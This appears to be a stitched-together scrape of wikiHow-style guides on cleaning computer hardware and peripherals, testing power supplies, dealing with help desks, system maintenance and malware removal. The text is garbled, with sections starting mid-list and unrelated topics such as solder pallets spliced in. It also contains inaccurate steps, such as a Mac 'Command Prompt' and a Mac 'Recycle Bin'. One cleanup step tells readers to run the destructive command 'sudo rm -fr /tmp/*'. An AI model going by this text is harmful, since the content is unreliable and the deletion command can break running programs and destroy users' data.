Avoid long, sustained blasts, as this will make your can of compressed air too cold to hold.
Don't blow compressed air on your fans. Blowing on the fans can make them spin faster than they are designed to, potentially damaging them.

, Use the vacuum to remove the large amounts of dust on the fan blades. Dip your toothbrush into the alcohol, and gently scrub the dust that remains off of the blades.


You may be able to access the fans easier if you remove them fist. You will need to remove the screws that secure the fan to the chassis, and then disconnect the cable that connects the fan to the motherboard. Make sure that you note where the fan was plugged in so that you can easily reconnect it when you're finished cleaning.
Make sure to reattach the fan in the same direction that it was originally installed. Fans blow in one direction, and reversing the direction of air flow can significantly impact the cooling of your machine. Most fans have an arrow printed on the top of the housing that indicates which way it blows.

, While a general vacuum and dusting is usually sufficient for basic cleaning, you'll want to remove individual components to really get them sparkling again. Make sure that you are properly grounded before touching any of the internal components. When you remove the components, set them on an antistatic surface, such as wood or rubber.You can remove the graphics card by removing the screws that secure it to the case, releasing the tab underneath, and then gently pulling it straight out. You may have to disconnect power cables in order to fully remove it. Set the graphics card on your cleaning surface and use the brush and alcohol to remove stubborn dust.
Removing the hard drive and any optical drives can make it easier to clean them, since they are often tucked away in hard-to-reach bays. Removing these drives typically involves opening both sides of the case so that you can reach the screws securing each side of the drive. Most optical drives are pulled out of the front of the case after the screws have been removed.
Removing the CPU cooler will allow you to clean out the cracks in the heat sink, as well as brush the dust out of the fans. Heat sinks attach in a variety of different ways, so make sure to consult your documentation before trying to remove it. Some require you to remove a bracket from the backside of the motherboard. If you remove the CPU cooler, you will need to apply a new layer of thermal paste to the CPU before reattaching it.

, Depending on your case, you may have some grates for fans and airflow. Use your compressed air to blow out from the inside of the case, and then run a feather duster over the grate from the outside.

, Even if you're just planning on running a vacuum over the keyboard, unplugging your keyboard first is probably a good idea. This will help reduce the chance of electrostatic discharge damage.

, You can perform a quick clean of your keyboard by running the tip of the vacuum over they keys. Press the keys in so that you can reach all of the crevices.

, Hold your keyboard upside down over a surface that's easy to clean or that you don't care about (such as outside). Run your hand over the keys while holding the keyboard upside down and shake it while you do so. You should see lots of debris shaking out.

, If you want to do a deep clean on your keyboard, you'll need to remove each of the keys so that they can be cleaned and you can access the innards of the keyboard. Removing keys is a little tedious, but can save you from needing to replace your keyboard when it gets bad.


To remove a key, press the key in front of it down. Insert a flat object such as a car key or flathead screwdriver under they key you want to remove. Gently pry the key up until it pops off. Repeat this process until all of the keys have been removed.
Space bars can be tricky, so you might want to leave the space bar attached.
Take a photo of your keyboard before removing the keys so that you have an easy reference for where they're supposed to go back to.

, Once you've taken all of the keys off, you can take the keyboard housing apart. Flip the keyboard over and unscrew all of the screws holding it together. Separate the various parts, making sure that you note where everything was connected.


Different keyboards come apart in different ways, and some keyboards may not be able to be disassembled.

, Once the keyboard has been disassembled, you can start washing most of the components. Anything that is just plastic can go through the dishwasher or be hand-washed. The keys can be washed individually by hand, or you can put them in an enclosed dishwasher basket.


Most keyboards will have a rubber contact mat that gives the keys their spring. This is completely non-electronic and can be run through dishwasher or cleaned with hot water and soap.
Don't wash anything that has a logic board or circuitry, and don't wash any cables. You can hand clean around these things using rubbing alcohol and a brush.

, Once everything has been washed and been given plenty of time to dry, you can put everything back together. Rebuild your keyboard, ensuring that all of the components go back together the same way the came apart. Refer to the picture of your keyboard when reattaching the keys.


You can reattach the keys by simply pressing them directly into their spot on the keyboard.
Make sure that everything is completely dry and cool before putting everything back together. Any moisture can ruin the keyboard when it is plugged back in.

, Before you begin cleaning the mouse, make sure that it has been unplugged from the computer. This will help prevent any damage to the mouse during the cleaning process.

, Use a cloth or brush dipped in rubbing alcohol and gently scrub the buttons. Use a toothpick to run through the crevices between buttons and lift out the debris inside. Wipe down all the surfaces that get touched or rubbed during use.

, Turn the mouse over and look at the lens underneath. Blow any excess debris off with compressed air, and then run a cotton swab dipped in rubbing alcohol around the lens once to remove stuck dust.

, Most mice have small rubber pads along the bottom. These help the mouse glide over the mousepad. Use a cloth dipped in rubbing alcohol to clean all of the dust and debris that has attached to the rubber pads. Give the entire bottom a wipe-down as well., Depending on your pad, you may have accumulated a fine layer of dust and debris on the surface of the mousepad itself. Most mouse pads are safe to run through the dishwasher, though your can hand wash them as well.

, Make sure that the monitor is unplugged disconnected from the computer. This will help prevent any static buildup.

, Use a microfiber or other soft cloth to very gently dust the screen. Do not pick at anything or try to scrub away debris. Simply run the cloth back and forth across the screen to pick up the dust.


Don't use paper towels, toilet paper, or facial tissue as these are usually rough and could damage the screen.

, You can purchase specialized cleaning solutions, but you can quickly and cheaply make one at home by mixing distilled water and white vinegar in a 50/50 solution. Dab or spray this onto your cloth, and then gently run the cloth across the screen.Never spray cleaning solution directly onto the screen, as this could seep inside and damage the components.
Avoid cleaning solutions with ammonia, like Windex, or ethyl alcohol.

Simply pass it over the screen, and it will pick up any dust that’s settled on it., Most televisions usually come with such a cloth specifically for cleaning. If you’ve misplaced it, you can purchase a microfiber cloth at most stores selling electronics. Make sure to wipe gently. Don’t rub or scrub with the cloth. Any smudges or marks on the screen won’t come off with just a cloth.

While more expensive than a rag, a microfiber cloth is best to wipe your screen. The reason for this is paper towels, rags or sponges can scratch your HDTV’s screen. Dirt, dust or other particles can get caught on them, causing the scratches., Use a measuring cup to make a solution that’s equal parts water and alcohol.

These programs can help you to retrieve data lost to different situations e.g. malware and viruses, power failure, bad sectors on the drive or logical drive damage.


However, you should not attempt to use recovery software on mechanically damaged drives, e.g. a drive ruined by dropping or soaking in water. Only use recovery software where the drive is functional. With such extremes, you may have only one shot at recovery, and any careless action you take may cause you to lose it forever. Package it carefully and transport it to specialist data recovery agents as soon as you can.
Instead of purchasing the recovery software, you can take it to a company that specializes in data recovery or get the software from companies that specialize in selling file recovery software.

,


Only use soft cloth. A static-free, fiber-free cloth works best, but most non-abrasive cloths will also work well. Do not, however, use paper towels, dish towels, or other rough cloths.
Do not drench the cloth in water. A soaked cloth is more likely to drip excess water into the machine, which could cause serious damage to your computer. If you accidentally use too much water, wring the cloth out well until it is only slightly moist.
For best results, use distilled water instead of tap water. Tap water contains minerals, and some of these minerals can be conductive. As a result, tap water is more likely to cause a short than distilled water.
Do not, under any circumstance, spray water directly onto the screen of the Macbook Pro.This significantly increases your odds of getting water into the machine, thereby making a short more likely. Only use water if you apply it with a soft cloth.

, Wipe the screen from side to side and top to bottom, working in small circular buffing motions. Apply sturdy but slight pressure to the screen as you work.


Hold the screen toward the very top or very bottom to avoid re-smudging it as you work.

, Use a cleaner specifically sold for use with LCD screens.


Spray a small amount of this cleaner onto your soft cloth. Do not drench the cloth. It should only feel a little moist to the touch, and you should not be able to squeeze any liquid out of it.






Only use soft, lint-free, and static-free cloths. Lens cloths work especially well, but any microfiber cloth will usually do the trick. Avoid paper towels, dish towels, terry cloth towels, and other abrasive fabrics.






Only use cleaning products specifically created and sold for use with LCD screens.Do not use all-purpose cleaners, alcohol-based products, bleach, aerosol sprays, solvents, or abrasives. All of these products could seriously damage the screen. In extreme cases, the screen may even break completely.
Do not spray the cleaning solution directly on the screen. Doing so increases the likelihood of getting moisture into the openings at the bottom or along the sides. Moisture should not be allowed through these openings, since it can short out your computer if it gets inside.

, Pass the cloth over the Macbook Pro screen, working either from top to bottom or from side to side. Buff the screen in small circular motions, applying steady but light pressure.


Hold the computer screen near the very top or very bottom to reduce the risk of accidentally smudging it as you work.

Apply to the computer body, both inside and outside the laptop.
Polish the keyboard with a cloth that's only very slightly damp. Stick to only a small amount of water for best results; if you do decide to use a cleaner, make sure it's labeled as safe for computers, and use only a very small amount, applied to the cloth (not the keyboard itself). Remove any excess cleanser so that it doesn't damage the MacBook's finish.
You can also use dry cotton swabs to get any dirt that's stuck between keys.
For the trackpad, be especially careful not to use any cleaning solutions, since the area is very delicate. Use a barely damp, lint-free cloth to wipe it, and then make sure you dry it immediately with another clean, lint-free cloth.
Don’t neglect underneath the computer. Actually, that is one area that is certain to be dirty. For the nonslip rubber on the bottom of some Macbook models, make sure you use a dye-free cloth to prevent discoloration.

Confirm there is no CD in the player.,
Blow away dust with a handheld air bulb.,
Remove the lens cover.,
Select a lint-free cleaner.,
Wipe a small amount of high-strength isopropyl alcohol onto the lens.,
Let dry before replacing the cover.,
Try a lens cleaner disc.,
Consider more involved repairs.",How to Clean a CD Player1," If the CD drive is tray-loaded, open the tray and disconnect the power cable without switching it off from the power button. This will leave the tray open, allowing you access to the slot.;
, These rubber bulbs are sold as dust blowers in places that stock cameras or jeweler's equipment. Squeeze the bulb to gently blow dust out of the slot and/or tray.


A can of compressed air is a risky alternative. Use brief blasts only to avoid excessive force, and check that the spray is completely dry first. Some brands spray a little liquid along with the air, which can destroy your drive., Assuming the dust blower didn't fix the problem, it's time to access the lens. Unless you have a snap-open portable player, you'll need to unscrew the device's outer case first. Once you have access to the tray that holds the CD, look for small catches or screws holding down the plastic cover over the lens assembly. Remove the screws or press on the catches carefully with a small screwdriver. You should see a small, circular lens to one side of the spindle, similar in size to the camera lens on a phone.This will likely void your warranty.

, A clean microfiber cloth is the ideal choice. You can find these at stores that sell electronics or eyeglasses. Special swabs for cleaning electronics will also work.Use cotton swabs only as a last resort. While they often work fine, there is a risk of scratching the lens.

, Use isopropyl alcohol with at least 91% concentration (and ideally ""reagent grade"" 99.9%). More diluted alcohol can leave a haze on the lens. Dampen the cloth slightly, without soaking it. Rub the cloth gently over the lens. Keep wiping until the center of the lens is shiny and has a blue tinge.A little haze around the perimeter is usually not a problem.You can use a lens cleaning solution instead of alcohol. In rare cases, you'll need deionized water to remove sugar-based residue.Deep scratches on the lens could make it unusable. If the scratches are barely visible, they are unlikely to be a problem.

, Wait a few minutes to avoid trapping any liquid alcohol inside the mechanism. While waiting, you can use the air bulb again to blow out any dust from the interior mechanism.


Avoid over-tightening the screws, which can crack the plastic case.

, These discs brush the CD drive lightly, removing dust. In most cases, a cleaner disc is less effective than the methods above, and a low-quality disc could even cause more damage.Try it if nothing else works, or skip to the next step if you're willing to try more complex repairs. Cleaner discs usually run automatically when you insert them, but check the product instructions first.


Do not use a CD cleaner disc on a combination CD/DVD player. Cleaner discs made for CD players will scratch a DVD drive.Check the product label for warnings before buying. Some discs are not compatible with some devices.

, If your CD player still won't work, you can try to disassemble it even more and examine other parts. This is fairly difficult, and may require the manual for your device. If you are patient and mechanically minded, try the following:Slowly turn the drive upside down while watching the lens. The lens should move up and down smoothly, without sticking or tilting. If it doesn't behave correctly, you may need to replace the whole pickup unit (or just get a new CD player).
Carefully remove components around the lens if possible. If you can access the turning mirror (a small piece of glass), clean it the same way you cleaned the lens.
Look for a plastic cogwheel attached to the laser mechanism. Turn this slowly with a swab and watch for moving parts. If any of them seem dirty or sticky, clean them with alcohol, then apply a thin layer of light lubricant suitable for electronics.

Shut down the computer.,
Test the power supply with a power supply testing unit.,
Test the power supply with a multimeter.,
Reassemble your computer.",How to Check a Power Supply," Once the computer has been shut down, or if it isn’t starting to begin with, flip the switch on the back of the power supply. Unplug the power supply from the outlet.;
, Disconnect the power supply cables from all of the components inside the case. Follow each cable from the power supply to the component to make sure that everything is properly unplugged.


Make note of where everything was plugged into for when you reassemble the case.

, You can use a paper clip to help test your power supply and trick it into thinking that it has been switched on. To do this, straighten a paperclip and then bend it into a “U” shape.


This paperclip will act as the pins that are inserted into the power supply that give it the “Power ON” signal.

, It is typically the largest connector for the power supply., You will be inserting the ends of the paperclip into the green pin (there should be only one) and a neighboring black pin. Before you do this, double check to make sure that the power supply is completely disconnected from any power outlet, that it is switched off, and that it is not connected to any computer components.


The green pin is typically pin 15 on a pin chart.

, Once you have placed the paperclip into each of the pins, place the cable somewhere where it won’t be disturbed. Plug the power supply back into the outlet, and flip the switch in the back.

, Once the power supply is receiving power, you should be able to hear and/or see a fan moving. This will let you know that the power supply is at least working. If the power supply does not turn on at all, double check your pins (after unplugging) and try again. If it still does not turn on, then it is most likely dead.This test will not tell you if the power supply is functioning as it should, just that it is turning on. You will need to perform the next test to ensure that it is outputting correctly.

, If your computer is functional and you can load your operating system, try using software to check your power supply’s output. SpeedFan is a freeware program that will read your computer’s diagnostics and report back your temperatures and voltage’s. Check the readouts to ensure that they fall within accepted tolerances.


If your computer does not work, skip to the next step.

, Unplug the power supply from the outlet. Turn off the power switch on the back of the power supply. Open the computer and disconnect all of the components from the power supply. Follow the cables from the power supply to each component to ensure that everything has been properly disconnected.

, These are available online and from computer stores, and are not very expensive. Find the 20/24 pin connector on the power supply. This is typically the largest cable for the power supply.


Connect the power supply testing unit to the 20/24 pin connector.
Plug the power supply back into the outlet and turn it on. Your power supply should turn on automatically and your power supply tester will light up.

Some power supply testers require you to turn on the power supply using a switch or button on the tester. Others will turn on automatically.


Check the voltages. The 20/24 pin connector will have multiple readouts, but there are 4 essential measurements you need to look for:

+3.3 VDC
+5 VDC
+12 VDC
-12 VDC


Ensure that the voltages are within normal accepted tolerances. +3.3, +5, +12 can all be within +/- 5%. The -12 can be within +/- 10%. If any of the readings are outside that range, than the power supply is bad and needs to be replaced.
Test the other connectors. Once you’ve verified that the main connector is outputting power properly, test each of the other connector cables one by one. Unplug and turn off the power supply between each test.

, Straighten a paperclip and then bend it into a “U” shape. Find the green pin on the 20/24 pin connector. Plug the paperclip into the green pin (pin 15) and into one of the neighboring black pins. This will trick the connector into thinking it’s plugged into the motherboard.


Plug the power supply back in and turn it on.
Find a pinout chart for your power supply. This will let you know which pins provide which voltages.
Set your multimeter to the VBDC setting. If your multimeter does not auto-range, set the range to 10V.
Connect the negative probe of the multimeter to a ground (black) pin on the connector.
Connect the positive probe to the first pin that you want to test. Make a note of the voltage displayed.
Check the voltages to make sure they fall within the tolerance threshold. If any of the voltages are outside of the tolerance range, then the power supply is defective.
Repeat the process for each of the peripheral connectors. Refer to the specific pinout charts for each connector to see which pins to test.

, Once you’ve tested and verified all of the power connectors, you can reassemble your computer. Ensure that all of your devices are properly plugged back in, and that all of the motherboard connectors are properly seated. Once you have finished reassembling the computer, you can try powering it on.


If you are still having computer errors, or your computer will not start, move on to other troubleshooting steps. The first place to check will be your motherboard.

Most older Motherboards have an AGP slot, but today modern Motherboards have one or even multiple PCI-E slots.;
,,(Modern Motherboards have an option of detecting a Video card before activating the on-board VGA, if so you can just put in the video card into the right slot on the motherboard and it'll auto-detect it without activating on-board video, but do read the next step before doing so.

, To avoid this you must ensure you are grounded when operating inside your computer. One way to do this is to purchase an anti-static wrist strap which you should wear at all times. The wrist-strap plugs into an electrical socket which will automatically discharge the static electricity in your body or touch a metal type part of your PC case with both hands (the PC must be off).

, Open this side of computer case by removing the screws at the back of the tower which are holding it in place. Then simply slide the panel off.

It is important to know exactly what the error said because in most cases this will accurately pinpoint the cause of the problem. Calling it the ""screen thingy that went out"" is not very helpful...;
, Many applications have sub-version numbers and those numbers matter to the help desk. This problem may have be resolved in version x.0.2

, (See related article.)

, If you have an Internet connection, search the error in a search engine such as Google. You might get the solution to your problem.

, Leave it off for a minute or so, then reboot the computer. Restarting is a simple action that solves a lot of random problems, and may save you the trouble of calling the Help desk to begin with.

, It is on your bill. Most tech support operators have to maintain an average call length, so if they spend the first few minutes hunting for your customer records, the part of the call where you receive the actual help may be rushed.

, If you're not sure of the Helpdesk phone number, check the documentation the company gave you (you kept it, right?). Alternatively, you could contact the vendor you bought the hardware from to find the number.

, Most help desks have just enough staff to keep customers from going elsewhere, and not one person more. Always remember that it is not the operators' fault; they're working as hard as they can. If you can't be seated in front of your computer for ten or fifteen minutes of troubleshooting, it might be best to put off calling until you can. It's very rare for a helpdesk to solve a problem without your involvement.

, The support staff is there to help you. It is very difficult to help when someone is irrational and angry. If you are upset, walk away and call once you have calmed down.

, The operator will ask you for the information gathered in the first few steps, and take you through the process of identifying the cause of the problem, and finding a solution.

When you make a decision to buy a computer component (i.e Video card), make sure that it is what you want and will be good enough to last at least a year.",How to Avoid the Urge to Upgrade Your Computer," There are many ways to increase the performance of your current computer without having to pay for an upgrade. Here's a good article to refer to for Windows Vista users. Many of the tips in that article will also work for both Windows XP and Windows 7 users;
, Did you see a game like Crysis, and you were drooling over the quality of the visuals? If so, try games known for their storyline, not their graphics. Some good examples would be:


Half Life 2, a game set in post-apocalyptic Europe, it's known for an amazing storyline.
Team Fortress 2, this game is an extremely popular multiplayer game, well known for its excellent class design.
Thief: The Dark Project and Thief 2, both are very old 3D games, don't expect good visuals, but they too have an amazing storyline, set in a Victorian-Steampunk world in which you are a thief.
Age of Empires 1 and 2, amazing strategy games in which you lead civilizations to expansion and conquest of either computer players or people online!
Plants vs Zombies, an extremely addictive tower-defense style game in which you build plants to protect your backyard from zombies, this game will even run on Netbooks!

Overclocking is another way, albeit risky, to improve your computer's performance. It involves forcing components (usually the CPU, but video cards can be overclocked as well) to perform calculations at higher speeds than their factory defaults. This can put your computer at risk though, especially if you mess around with voltages.







, An example of a component that won't drastically improve speed is the motherboard. Unless your existing motherboard is the lowest of low-end hardware, it should have good performance.

, A good example is computer programming, not only will it provide huge job opportunities if you become good at it, it will also provide a constructive use of your time.

, Sometimes when you find a deal on a computer component, you rush to buy it and in your excitement, you don't realize that maybe it doesn't have a DVI port, and you were planning on buying a new monitor this year. Now, when you go to buy the monitor, and it needs a DVI connection, you will have to buy a new video card.

, Use fixed as well as sprung pallets locations pins to provide flexibility. The pins should have protrusion of approximately 0.010″ above the flex circuit., These thermal relief areas help in improving the delta T at the time of reflow of lead-free solder alloy. In case you plan to using vapor phase for the reflow, you should consider the drain holes under the flex., Allow the protrusion of pallet clips by recessing a 0.006″ (150um) stencil on the base of the foil. You should recess the stencil by 0.003″. Use 2 varying sizes of apertures on 3 different footprints of electronic components for solder paste printing. For efficient SMT PCB assembly soldering, you need to place the recesses around pin protrusions from the pallet., To fix the lead-free soldered parts in place, the PCB assembly should be heated either by passing through a preheated and controlled oven, by using a hot air pencil, or with the help of an infrared lamp."

Keep your computer up to date.,
Clear Internet data.,
Check for adware and malware.,
Check for viruses and other immediate threats.,
Run maintenance on your hard drive.,
Remove unwanted programs.,
Keep your system backed up.",How to Clean Your Computer System1," Mac OS and Windows both release regular security and stability updates for your operating system. What's more, they've set up your computer's existing OS so that it knows what updates it needs and how to get them, saving you the trouble of keeping up, in most cases. The programs that handle these updates have self-evident names (Windows Update and Software Update), and are set to run automatically by default. If you've disabled updates, or you aren't sure whether your computer is being updated, follow the steps given below to check:

For Windows users, go to the Start Menu and search for “Windows Update.” The appropriate control panel should appear in the search results. Click it to read the status of your updates and explore automatic update settings in the sidebar or tabs. You can click on the words “Important Updates” and “Optional Updates” to select or deselect updates before downloading them. You can set your computer to download and install updates itself or you can perform this job manually.



 


Mac users should open the System Preferences menu from the Apple menu, and then choose Software Update from the View menu. All available updates will appear in a list. You can select which updates you want to install before continuing.






Updates obtained through these channels are always official and can be trusted. Therefore, it's generally recommended that you leave automatic updating on, unless you have a good reason for doing otherwise. This option should be available through the menu you already pulled up.





;
, As you browse the Internet, your computer collects bits and pieces of information that can eventually build up to the point that they cause performance issues, especially on older and slower machines. The most basic way to do this is by using the tools that come with your Internet browser of choice. Microsoft Internet Explorer users on Windows can clear all temporary data by visiting the Internet Options control panel item and clicking the Delete button on the General tab under the Browsing History subheading.


If you're using IE on a non-Windows computer, simply open the Tools menu, choose Options, and select the data you want to clear.






To erase temporary files, cookies, and cache data from Firefox, open the Firefox menu and open the Options window (this may require selecting Options from the drop down menu and then selecting Options again from the menu that appears). Once there click the tab or button that says Advanced, and then choose the Network tab underneath that. Find the box that has Offline Web Content in its header, and click the Clear button to clear your data.






To clear data from Chrome, simply hold down Control and Shift, and type Delete (as opposed to the Backspace button). A new tab will open up with a simple menu. Select the data you want to erase, set the time frame using the box in the upper right, and click Clear Browsing Data when you're satisfied.






To reach this menu the old-fashioned way, click the button with three horizontal lines on it in the upper right corner of the browser, and choose Settings from the menu that appears. Scroll partway down the screen to find the Privacy heading, then click the “Clear browsing data” button right underneath it.






To clear Safari's browsing cache, go to the Edit menu and select Empty Cache. Confirm your decision when asked.






If you have not sufficient time to perform these tasks you can use some browser cleanup tool.

, Adware and malware are types of programs that can compromise your computer's performance and create security weaknesses. There are specialized free programs designed to find and erase adware and spyware. Install and run the program (it's pretty straightforward) to find and delete offending files.

Mac users don't have many comprehensive options. The best-regarded overall is MacScan, which is powerful but costs money to use for more than 30 days. Fortunately, the cost for a home license is fairly low at just $39.99. Download the free trial first to be sure it'll work for you.






The best way to avoid adware and malware is to never download anything you're not sure of, and never agree to install anything extra that comes packaged with software you choose to install.







, The best way to defend your computer against truly malicious threats is with a powerful antivirus program. Both Mac and Windows users have access to good free options that work at least as well as paid brands. Install them and allow them to run in the background at all times. When you first install them, or if you suspect a virus may have been missed, you can run them manually as well.


Since new viruses are always being designed and released, it's very important that you allow your antivirus program to update as often as it needs to. Normally, this should take place in the background, without you having to do anything.







, Most computers made within the last several years take care of these tasks automatically, but you're always free to take care of them yourself if you want. The key tools are (1) disk defragmentation, which organizes the jumbled bits of data on your drive so that they can be found more quickly, and (2) disk cleanup, which deletes duplicate files and unused temporary ones to free up space.

Since the location of these tools varies from version to version of Windows, it's best to use a Start Menu search to find them quickly. Simply open and run them from the search results to speed up your computer, if the tasks haven't already been scheduled to run automatically.






Mac and Linux users don't typically need to defragment their hard disks, as the process is ongoing and automatic in the background. Mac users can clean up their hard disks with the Disk utility, located in the Utilities folder (normally inside the Applications folder on OS X systems).







, If you have extra programs, you remove them easily on Windows by using the Programs and Features (newer) or Add/Remove Programs (older) control panel. Highlight a program to see available options, and click to completely uninstall it. This is preferable to simply deleting the application yourself, as it removes files the program may have installed elsewhere as well.


Mac users can generally get away with just dragging unwanted programs into the Trash, but the process to fully remove things like Preference files and other scattered pieces is considerably more complicated – too complicated to cover in this guide.







, Once you've cleaned up your computer, it's time to preserve it in time so you can go back to a clean version if anything catastrophic happens in the future. This works quite differently depending on whether you're using a Mac or Windows, but the process is simple in either case.

Windows users should do a Start Menu search for “system restore,” and choose to create a restore point, which the computer can be rolled back to in the event of a disaster.






Mac users should set up Time Machine, a system preservation program, to run in the background. Time Machine allows you to roll back specific recent changes to rectify compatibility and other problems.






In either case, backing up to an external hard drive is recommended. Both methods require a lot of free space, and the external hard drive may be spared if the main hard drive has a mechanical malfunction.

Finish up.",How to Clean Your Computer System2," To safely and efficiently clean your computer, you'll need a few inexpensive items. Buy a can of compressed air, for blowing particles out of sensitive areas, at any computer store. Purchase cotton swabs (such as Q-Tips) and rubbing alcohol from a supermarket or pharmacy. Buy small or medium-sized Phillips-tip and flat-tip screwdrivers from a hardware store. Have paper towels, lint-free rags, and water on hand.


If you're cleaning a netbook, notebook, or laptop, opt for small screwdrivers. Desktop computers are likely to need medium-small screwdrivers instead. There's no need to buy special “computer screwdrivers or service kit,” in most cases.







, For desktop computers, this means shutting down the computer, turning off the surge protector or power strip, and unplugging the cord from the back of the tower (computer box). If you own a laptop instead, shut it down completely, unplug any power cords from it, turn it upside down, and remove the battery pack.


To prevent scuffing on a glossy finish, you can set your laptop upside-down on paper towels before you remove the battery pack.







, Over time, the fan and air vent and CPU heat-sink area that helps regulate your computer's temperature can get clogged with dust, dust bunnies and fibers, causing the CPU to overheat and hardware to malfunction. Hopefully, you don't wait to long between cleanings. To clean dust out, you'll need to open your computer's case.


To open a desktop computer, look for fasteners along the back or sides of the tower. These may be simple screws, or any of a number of other mechanisms. Some computers even have a sliding side panel for easy access. If you can't figure out what fastener your computer uses, consult the manual or check online.






You can't open a laptop computer completely without extra tools, but you won't need to. To get to the vent, look for a panel with screws in it on the bottom of the laptop. Unscrew the panel and the vent should come with it. Be very careful to note the length and position of each screw, as they tend to vary between one another.







, Start with cotton swabs or a pair of tweezers, and remove all of the larger dust bunnies and other debris you see. Follow through by spraying compressed air to chase the rest of the dust out of the vent system. Spray it everywhere else you can reach, too, taking care to keep the nozzle a few inches away from the components and I/O ports (plug holes for various cords). Don't forget to pop open your optical drives and briefly spray them out.


Obviously, the goal is to remove crumbs and dust, not push them farther into your computer. Be mindful of this as you aim your compressed air.






Compressed air can hurt/ruin sensitive components, if overused. Always spray from a little distance and in short bursts rather than a sustained stream.
It may be acceptable to gently tilt your laptop to encourage difficult particles to roll closer to where you can flush them out, but don't ever shake or slap it. You could loosen delicate parts.







, Do be sure to touch plastic and the metal frameworks repeatedly in and around the cabinet to equalize static electricity between your hands and those safe areas to touch., Put every part you opened or removed back in its proper place and close up your computer again. Once that's done, take a duster, a dry microfiber cloth, or some dry paper towels and brush obvious dust and dirt off of all sides of the computer case. Follow through by dipping one tip of a cotton swab in rubbing alcohol and running it along every seam and edge of your machine. As you finish a line, turn the swab over and dry it with the dry end.


Change swabs as often as you need to until the job is done. Don't skip!

, Start by turning your keyboard upside down over some newspaper or paper towels and shaking out all the crumbs you can. If you're cleaning a laptop, shake very gently to avoid damaging it. Once you've gotten all the crumbs you can, aim compressed air into the cracks and crevices to flush out more, and then shake them out again. Finally, use a small amount of rubbing alcohol on a cotton swab to clean the tops of the keys.

Don't use a vacuum cleaner on your keyboard, especially if you're using a laptop. The vacuum can create a static charge that could damage components underneath. You can also suction keys right off and into the vacuum dust container.






Touchpads and trackballs can be cleaned the same way as keys, with a cotton swab and a bit of rubbing alcohol. As always, discard each swab when it gets dirty and switch to a new one.







, For LCD displays like those found on most laptops, use plain water on a soft, lint-free cloth such as microfiber. Apply the water to the cloth, and then gently wipe the cloth across the screen until it's clean. For bulky CRT monitors (the kind often seen in computer labs), use a household glass cleaner instead. Again, be sure to spray the cloth rather than the monitor itself.


Some popular glass cleaners, such as Windex, contain ammonia. Ammonia may damage coatings on your CRT monitor, so use something ammonia-free instead unless you're sure it's okay.







, Allow every part to dry completely, then reassemble your setup and plug your computer back in. Don't forget to reattach any peripherals, such as a monitor, you might have removed while cleaning. When you're ready, start the computer up as normal. Repeat this cleaning regimen every few months or as needed.

Update your antivirus software and run a full scan.,
Clear up some space on the hard drive.,
Uninstall useless programs or programs you rarely use.,
Download and install a spyware removing program.,
Defragment your hard drive.,
Check your RAM.",How to Clean up a Slow Performing Computer," Antivirus software helps protect you from viruses and other suspect files that can spread by simply opening email. It performs regular system checks and detects when foreign files are trying to infiltrate your computer.


Norton and Kaspersky are the two standard-bearers in the industry, and can often be purchased for about $20.
Do not use Registry Optimizers or so called Clean Reg Tools. Most of these cause more harm than good in the future with your PC.;
, Deleting unnecessary files that your computer stores is an easy and simple way to free up memory and improve overall performance. To do this, access Disk Cleanup in Windows and delete Temporary Files on a Mac.


For Windows XP, Windows 7, and Vista: Click Start, click All Programs, click Accessories, click System Tools, and then click Disk Cleanup. If several drives are available, you might be prompted to specify which drive you want to clean.






For Mac: Go to Applications, click Utilities, and click Command Prompt. In the Command Prompt, type in ""sudo rm -fr /tmp/*"" and hit Enter. The temporary files that have been left behind on your computer will now be cleared.

, These can include games or media files that you or your children never use, as well as programs that have become redundant or obsolete.


For Windows: Follow the Start Menu to Settings and then to Control Panel. From this screen click on Add/remove programs or Uninstall a program and uninstall programs that are no longer needed.






For Mac: Kill unwanted or redundant programs by dropping the program files into the Recycle Bin.
Remember to empty your Recycle Bin after deleting these files because they are still on the hard drive and taking up space; just right click the icon and navigate to “Empty Bin.”







, Spyware is a kind of malicious software installed on computers that tracks certain information without the user's knowledge. For both privacy implications and the health of your computer, it's best to delete spyware and other ""malware.""


You should be able to download anti-spyware software on your computer for free. Once downloaded, install the program and run it; if you are not an advanced computer user, read the directions.

, Fragmentation basically is when your computer's files get disorganized, hurting your computer's ability to lay data out sequentially. Defragmentation is the correction to this process.


For Windows: click on My Computer, then click Properties, then click the Tools tab. From this tab just click on the Defragment button and then run the program. You can set it up so that your computer automatically defragments at set intervals.






For Mac: Mac operating systems rarely, if ever, need to have their disk space defragmented.

, RAM stands for Random Access Memory. These are the computer's memory chips, or how it stores information. If there are not enough of them the computer will use your hard disk to store intermediate results, but this is a much slower process. If this happens, the computer appears busy and is slow to write and read things from your hard disk. You can hear it, and the LED on the computer itself will light up.


Right click on the My Computer icon, then select properties, then read what is said on the 'General' tab. For Windows XP it should be 256 MB or more. If it is less then 1024 MB then it might be the problem.






If RAM is the real problem, your computer will be slow whenever you start a new application. If your computer is only slow when you turn on your computer or reboot, it is more likely that it is some other problem.
Before you rush out to get some additional RAM in a computer shop, make sure you know exactly what type fits in with your computer, and convince yourself that there are still empty slots (inside your computer) that can be used to put the RAM in.
For most people it is best to make a computer repair shop responsible for all this. Bring in your computer.

Ignore pop-ups telling you that you're infected with a virus, and that if you buy their product they will remove it for you.,
Notice the overall health of your PC.,
Run multiple Malware removal tools.,
Use a bootable anti-virus/anti-Malware .",How to Clean a Computer of Malware," This is usually a piece of Malware in itself. It might be included in what is known as a Malware suite, where you become infected with multiple strands of Malware at once. These strands may include pop-ups offering a product, keyloggers (a program that records your key strokes and sends them back to the metaphorical mother ship), Spyware (records your browsing habits to share with manufacturers who want to advertise their products), and rootkits (which is a program embedded in the root of your system in between the kernel and the software, this allows the Malware to not return requests from the software that are sent to look for the infection). Back to the topic at hand. If you were to get this software that was being advertised in the pop-up it may remove the most visible part of the Malware , and even may give your system a slight performance boost from its previously infected state. But it WILL NOT remove the Malware in its entirety. The best way to remove it is to stop the process from running and then perform system scans that would look for the infection, and remove it.;
, Is it running slower than it should be when you do not have many processes running? Maybe you've looked into it and noticed that your system says it isn't using up hardly any resources, but you can clearly tell that it is not running up to par. In this case you are probably infected, but the strand of Malware you are dealing with is hiding itself from you. This just goes to show the ingenuity of the coders behind this product nowadays. The process behind removing it is still somewhat the same. You should start by either stopping, or suspending any processes that you know are related to the Malware , (it wouldn't hurt to close any processes to programs you aren't currently using as well) and begin running system scans for the infection.





, Today's Malware is written in such a way that it knows to hide itself from some of the more well known scanning tools (i.e. Norton, AVG, even Malwarebytes). Which is just another reason why you as the PC user needs to run multiple scans to be able to pick up on the various Malware that may be on your computer.

